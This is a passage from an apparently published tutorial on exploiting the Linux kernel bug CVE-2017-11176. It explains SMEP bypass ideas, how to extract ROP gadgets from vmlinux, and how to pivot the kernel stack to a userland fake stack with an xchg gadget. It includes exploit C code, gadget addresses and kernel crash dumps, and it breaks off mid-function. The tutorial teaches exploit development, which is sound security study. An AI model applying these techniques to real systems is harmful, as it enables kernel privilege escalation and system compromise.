the physmap.</p><p>The PFN of a userland address <em>uaddr</em> can be retrieved by seeking the <em>pagemap</em> file and read an 8-byte value at offset:</p><div class="highlight"><pre><span></span><code><span class="n">PFN</span><span class="p">(</span><span class="n">uaddr</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">uaddr</span><span class="o">/</span><span class="mi">4096</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="w"></span>
</code></pre></div><p>If you want to know more about this attack, see <a href="https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-kemerlis.pdf">ret2dir: Rethinking Kernel Isolation</a>.</p><h2 id="overwriting-paging-structure-entries">Overwriting Paging-Structure Entries</h2><p>If we look again at the <em>Determination of Access Rights (4.6.1)</em> section in the Intel documentation, we get:</p><div class="highlight"><pre><span></span><code>Access rights are also controlled by the mode of a linear address as specified by
the paging-structure entries controlling the translation of the linear address.

If the U/S flag (bit 2) is 0 in at least one of the paging-structure entries, the
address is a supervisor-mode address. Otherwise, the address is a user-mode address.
</code></pre></div><p>The address we are trying to jump to is considered as a <em>user-mode address</em> since the <strong>U/S flag is set</strong>.</p><p>One way to bypass SMEP is to overwrite <strong>at least one paging-structure entry</strong> (PTE, PMD, etc.) and clear bit 2. It implies that we know where this PGD/PUD/PMD/PTE is located in memory. This kind of attack is easier to do with an <strong>arbitrary read/write primitives</strong>.</p><hr><h1 id="finding-gadgets">Finding Gadgets</h1><p>Finding ROP gadgets in Kernel is similar to userland exploitation. First we need the <strong>vmlinux</strong> binary and (optionally) the <strong>System.map</strong> files that we already extracted in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">part 3</a>. Since <em>vmlinux</em> is an <strong>ELF binary</strong>, we can use <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>.</p><p>However, <em>vmlinux</em> is not a typical ELF binary. It embeds <a href="https://lwn.net/Articles/531148/">special sections</a>. If you look at the various sections using <strong>readelf</strong> you can see that there are a lot of them:</p><div class="highlight"><pre><span></span><code>$ readelf -l vmlinux-2.6.32 

Elf file type is EXEC (Executable file)
Entry point 0x1000000
There are 6 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  LOAD           0x0000000000200000 0xffffffff81000000 0x0000000001000000
                 0x0000000000884000 0x0000000000884000  R E    200000
  LOAD           0x0000000000c00000 0xffffffff81a00000 0x0000000001a00000
                 0x0000000000225bd0 0x0000000000225bd0  RWE    200000
  LOAD           0x0000000001000000 0xffffffffff600000 0x0000000001c26000
                 0x00000000000008d8 0x00000000000008d8  R E    200000
  LOAD           0x0000000001200000 0x0000000000000000 0x0000000001c27000
                 0x000000000001ff58 0x000000000001ff58  RW     200000
  LOAD           0x0000000001247000 0xffffffff81c47000 0x0000000001c47000
                 0x0000000000144000 0x0000000000835000  RWE    200000
  NOTE           0x0000000000760f14 0xffffffff81560f14 0x0000000001560f14
                 0x000000000000017c 0x000000000000017c         4

 Section to Segment mapping:
  Segment Sections...
   00     .text .notes __ex_table .rodata __bug_table .pci_fixup __ksymtab __ksymtab_gpl __kcrctab __kcrctab_gpl __ksymtab_strings __init_rodata __param __modver 
   01     .data 
   02     .vsyscall_0 .vsyscall_fn .vsyscall_gtod_data .vsyscall_1 .vsyscall_2 .vgetcpu_mode .jiffies .fence_wdog_jiffies64 
   03     .data.percpu 
   04     .init.text .init.data .x86_cpu_dev.init .parainstructions .altinstructions .altinstr_replacement .exit.text .smp_locks .data_nosave .bss .brk 
   05     .notes 
</code></pre></div><p>In particular, it has a <strong>.init.text</strong> section which seems executable (use the <strong>-t</strong> modifier):</p><div class="highlight"><pre><span></span><code>[25] .init.text
       PROGBITS               PROGBITS         ffffffff81c47000  0000000001247000  0
       000000000004904a 0000000000000000  0                 16
       [0000000000000006]: ALLOC, EXEC
</code></pre></div><p>This section describes code that is only used during the boot process. Code belonging to this section can be retrieved with the <strong>__init</strong> preprocessor macro defined here:</p><div class="highlight"><pre><span></span><code><span class="cp">#define __init      __section(.init.text) __cold notrace</span>
</code></pre></div><p>For instance:</p><div class="highlight"><pre><span></span><code><span class="c1">// [mm/slab.c]</span>

<span class="cm">/*</span>
<span class="cm"> * Initialisation.  Called after the page allocator have been initialised and</span>
<span class="cm"> * before smp_init().</span>
<span class="cm"> */</span><span class="w"></span>
<span class="kt">void</span><span class="w"> </span><span class="n">__init</span><span class="w"> </span><span class="n">kmem_cache_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p><strong>Once the initialization phase is complete, this code is unmapped from memory</strong>. In other words, using a gadget belonging to this section will result in a page fault in kernel land, making it crash (cf. previous section).</p><p>Because of this (other special executable sections have other traps), we will avoid searching gadgets in those "special sections" and limit the research to the ".text" section only. Start and ending addresses can be found with the <strong>_text</strong> and <strong>_etext</strong> symbol:</p><div class="highlight"><pre><span></span><code>$ egrep <span class="s2">" _text</span>$<span class="s2">| _etext</span>$<span class="s2">"</span> System.map-2.6.32                                          
ffffffff81000000 T _text
ffffffff81560f11 T _etext
</code></pre></div><p>Or with <em>readelf</em> (<em>-t</em> modifier):</p><div class="highlight"><pre><span></span><code>  [ 1] .text
       PROGBITS               PROGBITS         ffffffff81000000  0000000000200000  0
       0000000000560f11 0000000000000000  0                 4096
       [0000000000000006]: ALLOC, EXEC
</code></pre></div><p>Let's extract all gadgets with:</p><div class="highlight"><pre><span></span><code>$ ./ROPgadget.py --binary vmlinux-2.6.32 --range 0xfffffff81000000-0xffffffff81560f11 <span class="p">|</span> sort &gt; gadget.lst
</code></pre></div><p><strong>WARNING</strong>: Gadgets from <em>[_text; _etext[</em> aren't 100% guaranteed to be valid at runtime for various reasons. You should inspect memory before executing the ROP-chain (cf. "Debugging the kernel with GDB").</p><p>Alright, we are ready to ROP.</p><hr><h1 id="stack-pivoting">Stack Pivoting</h1><p>In the previous sections we saw that:</p><ul><li>the kernel crashes (page fault) while trying to jump to user-land code because of SMEP</li><li>SMEP can be disabled by flipping a bit in CR4</li><li>we can only use gadgets in the <em>.text</em> section and extract them with <em>ROPgadget</em></li></ul><p>In the "Core Concept #4" section, we saw that while executing a syscall code, the kernel stack (rsp) is pointing to the current <em>kernel thread stack</em>. In this section, we will use our arbitrary call primitive to pivot the stack to a userland one. Doing so will allow us to control a "fake" stack and execute the ROP-chain of our choice.</p><h2 id="analyze-attacker-controlled-data">Analyze Attacker-Controlled Data</h2><p>The <em>__wake_up_common()</em> function has been analyzed in deeper details in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">part 3</a>. As a reminder, the code is:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">__wake_up_common</span><span class="p">(</span><span class="n">wait_queue_head_t</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">mode</span><span class="p">,</span><span class="w"></span>
<span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">nr_exclusive</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">wake_flags</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">wait_queue_t</span><span class="w"> </span><span class="o">*</span><span class="n">curr</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">next</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">list_for_each_entry_safe</span><span class="p">(</span><span class="n">curr</span><span class="p">,</span><span class="w"> </span><span class="n">next</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">task_list</span><span class="p">,</span><span class="w"> </span><span class="n">task_list</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="kt">unsigned</span><span class="w"> </span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">flags</span><span class="p">;</span><span class="w"></span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="n">curr</span><span class="p">,</span><span class="w"> </span><span class="n">mode</span><span class="p">,</span><span class="w"> </span><span class="n">wake_flags</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"></span>
<span class="w">                </span><span class="p">(</span><span class="n">flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">WQ_FLAG_EXCLUSIVE</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!--</span><span class="n">nr_exclusive</span><span class="p">)</span><span class="w"></span>
<span class="w">            </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Which is invoked with (we almost fully control the content of <em>nlk</em> with reallocation):</p><div class="highlight"><pre><span></span><code><span class="n">__wake_up_common</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">wait</span><span class="p">,</span><span class="w"> </span><span class="n">TASK_INTERRUPTIBLE</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"></span>
</code></pre></div><p>In particular, our arbitrary call primitive is invoked here:</p><div class="highlight"><pre><span></span><code>ffffffff810618f7:       44 8b 20                mov    r12d,DWORD PTR [rax]       // "flags = curr-&gt;flags"
ffffffff810618fa:       4c 89 f1                mov    rcx,r14                    // 4th arg: "key"
ffffffff810618fd:       44 89 fa                mov    edx,r15d                   // 3nd arg: "wake_flags"
ffffffff81061900:       8b 75 cc                mov    esi,DWORD PTR [rbp-0x34]   // 2nd arg: "mode"
ffffffff81061903:       48 89 c7                mov    rdi,rax                    // 1st arg: "curr"
ffffffff81061906:       ff 50 10                call   QWORD PTR [rax+0x10]       // ARBITRARY CALL PRIMITIVE
</code></pre></div><p>Let's relaunch the exploit:</p><div class="highlight"><pre><span></span><code>...
[+] g_uland_wq_elt addr = 0x602860
[+] g_uland_wq_elt.func = 0x4014c4
...
</code></pre></div><p>The register status when crashing is:</p><div class="highlight"><pre><span></span><code>[  453.993810] RIP: 0010:[&lt;00000000004014c4&gt;]  [&lt;00000000004014c4&gt;] 0x4014c4
                          ^ &amp;payload()
[  453.993932] RSP: 0018:ffff88001b527e60  EFLAGS: 00010016
                         ^ kernel thread stack top
[  453.994003] RAX: 0000000000602860 RBX: 0000000000602878 RCX: 0000000000000000
                    ^ curr                ^ &amp;task_list.next     ^ "key" arg
[  453.994086] RDX: 0000000000000000 RSI: 0000000000000001 RDI: 0000000000602860
                    ^ "wake_flags" arg    ^ "mode" arg          ^ curr
[  453.994199] RBP: ffff88001b527ea8 R08: 0000000000000000 R09: 00007fc0fa180700
                    ^ thread stack base   ^ "key" arg           ^ ???
[  453.994275] R10: 00007fffa3c8b860 R11: 0000000000000202 R12: 0000000000000001
                    ^ ???                 ^ ???                 ^ curr-&gt;flags
[  453.994356] R13: ffff88001bdde6b8 R14: 0000000000000000 R15: 0000000000000000
                    ^ nlk-&gt;wq [REALLOC]   ^ "key" arg           ^ "wake_flags" arg
</code></pre></div><p>Wow... It seems we are really lucky! Both <strong>rax</strong>, <strong>rbx</strong> and <strong>rdi</strong> point to our userland wait queue element. Of course, this is not fortuitous. It is another reason why we choose this arbitrary call primitive in the first place.</p><h2 id="the-pivot">The Pivot</h2><p>Remember <strong>the stack is only defined by the <em>rsp</em> register</strong>. Let's use one of our controlled registers to overwrite it. A common gadget used in this kind of situation is:</p><div class="highlight"><pre><span></span><code>xchg rsp, rXX ; ret
</code></pre></div><p>It exchanges the value of <em>rsp</em> with a controlled register while saving it. Hence, it helps to restore the stack pointer afterward.</p><p><strong>NOTE</strong>: You <em>might</em> use a <em>mov</em> gadget instead but you will lose the current stack pointer value, hence not be able to repair the stack afterward. This is not exactly true... You can repair it by using RBP or the <em>kernel_stack</em> variable (cf. Core Concepts #4) and add a "fixed offset" since the stack layout is known and deterministic. The <em>xchg</em> instruction just make things simpler.</p><div class="highlight"><pre><span></span><code>$ egrep <span class="s2">"xchg [^;]*, rsp|xchg rsp, "</span> ranged_gadget.lst.sorted
0xffffffff8144ec62 : xchg rsi, rsp <span class="p">;</span> dec ecx <span class="p">;</span> cdqe <span class="p">;</span> ret
</code></pre></div><p>Looks like we only have 1 gadget that does this in our kernel image. In addition, the <em>rsi</em> value is 0x0000000000000001 (and we can't control it). This <strong>implies mapping a page at address zero which is not possible anymore</strong> to prevent "NULL-deref" bugs exploitation.</p><p>Let's extend the research to the "esp" register which brings much more results:</p><div class="highlight"><pre><span></span><code>$ egrep <span class="s2">"(: xchg [^;]*, esp|: xchg esp, ).*ret</span>$<span class="s2">"</span> ranged_gadget.lst.sorted
...
0xffffffff8107b6b8 : xchg eax, esp <span class="p">;</span> ret
...
</code></pre></div><p>However, the <em>xchg</em> instruction here works on 32-bit registers. That is, <strong>the 32 most significant bits will be zeroed!</strong></p><p>If you are not convinced yet, just run (and debug) the following program:</p><div class="highlight"><pre><span></span><code><span class="c1"># Build-and-debug with: as test.S -o test.o; ld test.o; gdb ./a.out</span>

<span class="na">.text</span>
<span class="na">.global</span> <span class="no">_start</span>

<span class="nl">_start:</span>
  <span class="nf">mov</span> <span class="no">$0x1aabbccdd</span><span class="p">,</span> <span class="nv">%rax</span>
  <span class="nf">mov</span> <span class="no">$0xffff8000deadbeef</span><span class="p">,</span> <span class="nv">%rbx</span>
  <span class="nf">xchg</span> <span class="nv">%eax</span><span class="p">,</span> <span class="nv">%ebx</span>                 <span class="c1"># &lt;---- check "rax" and "rbx" past this instruction (gdb)</span>
</code></pre></div><p>That is, after executing the stack pivot gadget, the 64-bit registers become:</p><ul><li><strong>rax</strong> = 0xffff88001b527e60 &amp; 0x00000000ffffffff = 0x000000001b527e60</li><li><strong>rsp</strong> = 0x0000000000602860 &amp; 0x00000000ffffffff = 0x0000000000602860</li></ul><p>This is actually not a problem because of the virtual address mapping where userland address ranges from 0x0 to 0x00007ffffffff000 (cf. Core Concept #4). In other words, any 0x<strong>00000000</strong>XXXXXXXX address is a valid userland one.</p><p>The stack is now pointing to userland where we can control data and starts our ROP chain. The register state before and after executing the stack pivot gadget are:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/stack_pivot.png" title="Before/After Stack Pivot"><figcaption class="figcaption figure-caption text-center">stack_pivot.png</figcaption></figure><p></p><p><strong>ERRATA</strong>: <em>RSP</em> is pointing 8 bytes after <em>RDI</em> since the <em>ret</em> instruction "pop" a value before executing it (i.e. should point to <em>private</em>). Please see the next section.</p><p><strong>NOTE</strong>: <em>rax</em> is pointing in a "random" userland address since it only holds the lowest significant bytes of the previous <em>rsp</em> value.</p><h2 id="dealing-with-aliasing">Dealing with Aliasing</h2><p>Before going further there are few things to consider:</p><ul><li>the new "fake" stack is now <strong>aliasing</strong> with the wait queue element object (in userland).</li><li>since the 32 highest significant bits are zero'ed, the fake stack must be mapped at an address lower than 0x100000000.</li></ul><p>Right now, the <strong>g_uland_wq_elt</strong> is declared globally (i.e. the <em>bss</em>). Its address is "0x602860" which is lower than 0x100000000.</p><p>Aliasing can be an issue as it:</p><ul><li>forces us to use a <strong>stack lifting</strong> gadget to "jump over" the <em>func</em> gadget (i.e. don't execute the "stack pivot" gadget again)</li><li>imposes constraints on the gadgets as the wait queue element must still be valid (in <em>__wake_up_common()</em>)</li></ul><p>There are two ways to deal with this "aliasing" issue:</p><ol><li>Keep the fake stack and wait queue aliased and use a <strong>stack lifting</strong> with constrained gadgets</li><li>Move <em>g_uland_wq_elt</em> into "higher" memory (after the 0x100000000 mark).</li></ol><p>Both techniques works.</p><p>For instance, if you want to implement the first way (we won't), the next gadget address must have its lowest significant bits set because of the <em>break</em> condition in <em>__wake_up_common()</em>:</p><div class="highlight"><pre><span></span><code><span class="p">(</span><span class="n">flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">WQ_FLAG_EXCLUSIVE</span><span class="p">)</span><span class="w">   </span><span class="c1">// WQ_FLAG_EXCLUSIVE == 1</span>
</code></pre></div><p>In this particular example, this first condition can be easily overcomed by using a <em>NOP</em> gadget which has its least significant bit set:</p><div class="highlight"><pre><span></span><code>0xffffffff8100ae3d : nop ; nop ; nop ; ret    // &lt;---- valid gadget
0xffffffff8100ae3e : nop ; nop ; ret          // &lt;---- BAD GADGET
</code></pre></div><p>Instead, <strong>we will implement the second</strong> as we think it is more "interesting", less <em>gadget-dependent</em> and exposes a technique that is sometimes used during exploit (<em>having addresses relative to each other</em>). In addition, we will have more choices in our ROP-chain gadgets as they will be less constrained because of the aliasing.</p><p>In order to declare our (userland) wait queue elements at an arbitrary location, we will use the <strong>mmap()</strong> syscall with the <em>MAX_FIXED</em> argument. We will do the same for the "fake stack". <strong>Both are linked with the following property</strong>:</p><div class="highlight"><pre><span></span><code>ULAND_WQ_ADDR = FAKE_STACK_ADDR + 0x100000000
</code></pre></div><p>In other words:</p><div class="highlight"><pre><span></span><code><span class="p">(</span><span class="n">ULAND_WQ_ADDR</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xffffffff</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">FAKE_STACK_ADDR</span><span class="w"></span>
<span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">pointed</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">RAX</span><span class="w"> </span><span class="n">before</span><span class="w"> </span><span class="n">XCHG</span><span class="w">   </span><span class="o">^</span><span class="w"> </span><span class="n">pointed</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">RSP</span><span class="w"> </span><span class="n">after</span><span class="w"> </span><span class="n">XCHG</span><span class="w"></span>
</code></pre></div><p>This is implemented in <em>allocate_uland_structs()</em>:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">allocate_uland_structs</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// arbitrary value, must not collide with already mapped memory (/proc/&lt;PID&gt;/maps)</span>
<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">starting_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="mh">0x20000000</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">  </span><span class="n">g_fake_stack</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">_mmap</span><span class="p">(</span><span class="n">starting_addr</span><span class="p">,</span><span class="w"> </span><span class="mi">4096</span><span class="p">,</span><span class="w"> </span><span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="n">MAP_FIXED</span><span class="o">|</span><span class="n">MAP_SHARED</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_LOCKED</span><span class="o">|</span><span class="n">MAP_POPULATE</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">  </span><span class="n">g_uland_wq_elt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">wait_queue</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">_mmap</span><span class="p">(</span><span class="n">g_fake_stack</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x100000000</span><span class="p">,</span><span class="w"> </span><span class="mi">4096</span><span class="p">,</span><span class="w"> </span><span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="n">MAP_FIXED</span><span class="o">|</span><span class="n">MAP_SHARED</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_LOCKED</span><span class="o">|</span><span class="n">MAP_POPULATE</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p><strong>WARNING</strong>: Using <em>MAP_FIXED</em> might "overlap" existing memory! For a better implementation, we should check that the <em>starting_addr</em> address is not already used (e.g. check <em>/proc/&lt;PID&gt;/maps</em>)! Look at the <em>mmap()</em> syscall implementation, you will learn a lot. This is a <strong>great</strong> exercise.</p><p>That is, after executing the "stack pivot gadget", our exploit memory layout will be:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/aliasing.png" title="Aliasing Tricks"><figcaption class="figcaption figure-caption text-center">aliasing.png</figcaption></figure><p></p><p>Let's update the exploit code (warning: <em>g_uland_wq_elt</em> is a pointer now, edit the code accordingly):</p><div class="highlight"><pre><span></span><code><span class="c1">// 'volatile' forces GCC to not mess up with those variables</span>
<span class="k">static</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w">  </span><span class="n">g_fake_next_elt</span><span class="p">;</span><span class="w"></span>
<span class="k">static</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="k">struct</span> <span class="nc">wait_queue</span><span class="w"> </span><span class="o">*</span><span class="n">g_uland_wq_elt</span><span class="p">;</span><span class="w"></span>
<span class="k">static</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">g_fake_stack</span><span class="p">;</span><span class="w"></span>

<span class="c1">// kernel functions addresses</span>
<span class="cp">#define PANIC_ADDR ((void*) 0xffffffff81553684)</span>

<span class="c1">// kernel gadgets in [_text; _etext]</span>
<span class="cp">#define XCHG_EAX_ESP_ADDR ((void*) 0xffffffff8107b6b8)</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">payload</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span><span class="w"></span>

<span class="c1">// ----------------------------------------------------------------------------</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">build_rop_chain</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="o">*</span><span class="n">stack</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="n">memset</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack</span><span class="p">,</span><span class="w"> </span><span class="mh">0xaa</span><span class="p">,</span><span class="w"> </span><span class="mi">4096</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="o">*</span><span class="n">stack</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="o">*</span><span class="n">stack</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xbbbbbbbbbbbbbbbb</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="o">*</span><span class="n">stack</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xcccccccccccccccc</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="o">*</span><span class="n">stack</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xdddddddddddddddd</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// FIXME: implement the ROP-chain</span>
<span class="p">}</span><span class="w"></span>

<span class="c1">// ----------------------------------------------------------------------------</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">allocate_uland_structs</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// arbitrary value, must not collide with already mapped memory (/proc/&lt;PID&gt;/maps)</span>
<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">starting_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="mh">0x20000000</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">size_t</span><span class="w"> </span><span class="n">max_try</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">10</span><span class="p">;</span><span class="w"></span>

<span class="nl">retry</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">max_try</span><span class="o">--</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] failed to allocate structures at fixed location</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="n">starting_addr</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">4096</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="n">g_fake_stack</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">_mmap</span><span class="p">(</span><span class="n">starting_addr</span><span class="p">,</span><span class="w"> </span><span class="mi">4096</span><span class="p">,</span><span class="w"> </span><span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="n">MAP_FIXED</span><span class="o">|</span><span class="n">MAP_SHARED</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_LOCKED</span><span class="o">|</span><span class="n">MAP_POPULATE</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">g_fake_stack</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">MAP_FAILED</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] mmap"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">retry</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="n">g_uland_wq_elt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">wait_queue</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">_mmap</span><span class="p">(</span><span class="n">g_fake_stack</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x100000000</span><span class="p">,</span><span class="w"> </span><span class="mi">4096</span><span class="p">,</span><span class="w"> </span><span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="n">MAP_FIXED</span><span class="o">|</span><span class="n">MAP_SHARED</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_LOCKED</span><span class="o">|</span><span class="n">MAP_POPULATE</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">g_uland_wq_elt</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">MAP_FAILED</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] mmap"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">munmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">g_fake_stack</span><span class="p">,</span><span class="w"> </span><span class="mi">4096</span><span class="p">);</span><span class="w"></span>
